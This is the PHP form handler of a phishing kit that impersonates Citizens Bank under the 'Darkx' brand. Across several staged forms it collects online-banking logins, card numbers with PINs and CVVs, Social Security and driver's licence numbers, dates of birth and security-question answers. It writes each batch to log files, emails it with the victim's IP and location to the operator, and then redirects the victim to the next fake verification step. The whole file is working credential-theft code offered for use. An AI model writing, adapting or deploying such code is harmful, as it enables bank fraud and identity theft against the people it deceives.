<?php 
	session_start();

	        // variable declaration
	        $errors = array(); 


	       if (isset($_POST['ReasonCode']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // Get User Input
	          $UserID = $_POST['UserID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::: Darkx Citizen Bank Info [Login Details] ::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="Citizen Bank Darkx Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../question_auth.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../login.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	          if(isset($_POST['UserID'])&&isset($_POST['password']))
	          {
	          include 'recon.php';
	          include 'mail.php'; 
	          // check for valid email address
	          $UserID = $_POST['UserID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx Citizen Bank Info [Login Details] :::::::::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
	         
              $subject="Citizen Bank Darkx Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	          
	          $headers="From: Darkx Citizen Bank V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($to, $subject, $body, $headers))
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          else
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          }
	          
	          if (isset($_POST['credit_verify']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // check for valid email address 
	          $ccnum = $_POST['ccnum'];
	          $pin = $_POST['pin']; 
	          $expdate = $_POST['expdate'];
	          $cvv = $_POST['cvv']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx Citizen Bank Info [Card Details] :::::::::::::::::::::::::\r\n"; 
	          $body .= "Card Number                          : $ccnum\r\n";
	          $body .= "Card Pin                             : $pin\r\n";
	          $body .= "Card Expiry Date                     : $expdate\r\n";
	          $body .= "Card Security Code                   : $cvv\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/credit_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
             
	          $subject="Citizen Bank Darkx Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../mail_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }

	          if (isset($_POST['account_verify']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // check for valid email address
	          $fname = $_POST['fname'];
	          $dob = $_POST['dob'];
	          $dlnum = $_POST['dlnum'];
	          $lname = $_POST['lname']; 
	          $address = $_POST['address'];  
	          $zipcode = $_POST['zipcode'];
	          $city = $_POST['city'];
	          $ssn = $_POST['ssn'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx Citizen Bank Info [Fullz Details] :::::::::::::::::::::::::\r\n";
	          $body .= "First Name                         : $fname\r\n";
	          $body .= "Last Name                          : $lname\r\n";
	          $body .= "Date Of Birth                      : $dob\r\n";
	          $body .= "DL Number                          : $dlnum\r\n";
	          $body .= "Social Security Number             : $ssn\r\n";
	          $body .= "City                               : $city\r\n"; 
	          $body .= "Address                            : $address\r\n";
	          $body .= "ZipCode                            : $zipcode\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/account_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="Citizen Bank Darkx Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../credit_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../account_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	      if (isset($_POST['quest_verify']))
	          {
	          	include 'recon.php';
	          	include 'mail.php';
	          // check for valid email address 
	          $quest1 = $_POST['quest1'];
	          $quest2 = $_POST['quest2']; 
	          $quest3 = $_POST['quest3'];
	          $ans1 = $_POST['ans1'];
	          $ans2 = $_POST['ans2'];
	          $ans3 = $_POST['ans3']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: Darkx Citizen Bank Info [Security Questions] :::::::::::::::::::::::::\r\n"; 
	          $body .= "Security Question 1                  : $quest1\r\n";
	          $body .= "Answer 1                             : $ans1\r\n";
	          $body .= "Security Question 2                  : $quest2\r\n";
	          $body .= "Answer 2                             : $ans2\r\n";
	          $body .= "Security Question 3                  : $quest3\r\n";
	          $body .= "Answer 3                             : $ans3\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: Darkx Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/security_quest.txt","a+");
	          fwrite($save,$body);
	          fclose($save);
 
	          $subject="Citizen Bank Darkx Security Questions => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank Darkx V1 <darkxxcoder@gmail.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($to, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../account_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../question_auth.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
?>